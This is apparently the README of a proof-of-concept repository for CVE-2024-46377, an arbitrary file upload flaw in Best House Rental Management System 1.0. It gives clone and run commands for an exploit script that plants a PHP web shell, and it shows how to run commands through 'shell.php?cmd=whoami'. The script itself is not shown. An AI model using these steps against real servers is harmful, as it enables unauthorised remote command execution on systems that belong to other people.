# CVE-2024-46377

# PoC for Arbitrary File Upload Vulnerability in Best House Rental Management System 1.0

## Overview

This Python script demonstrates how to exploit the arbitrary file upload vulnerability in **Best House Rental Management System 1.0**. The vulnerability allows an attacker to upload a malicious file (such as a PHP web shell) and execute arbitrary commands on the target server.

### Usage

1. Clone the repository and navigate into the directory:

   ```bash
   git clone https://github.com/yourusername/house-rental-poc.git
   cd house-rental-poc
   ```

    Run the exploit with the following parameters:

    bash

     ``` python exploit_house_rental.py <target_url> <file_upload_path> <session_cookie>```

    target_url: The URL of the vulnerable file upload page (e.g., http://<target-site>/rental/admin_class.php?view=save_settings)
    file_upload_path: The path where the uploaded files are stored (e.g., http://<target-site>/path/to/uploaded/files)
    session_cookie: The session cookie of the authenticated user

If successful, you will be able to execute commands on the target server by visiting:

bash

    http://<file_upload_path>/shell.php?cmd=whoami

    Test it by executing commands such as whoami or uname -a.

Example

 ``` python exploit_house_rental.py http://127.0.0.1/rental/admin_class.php?view=save_settings http://127.0.0.1/uploads/ SESSION_ID=123456789```
  
This code is released under the MIT License.
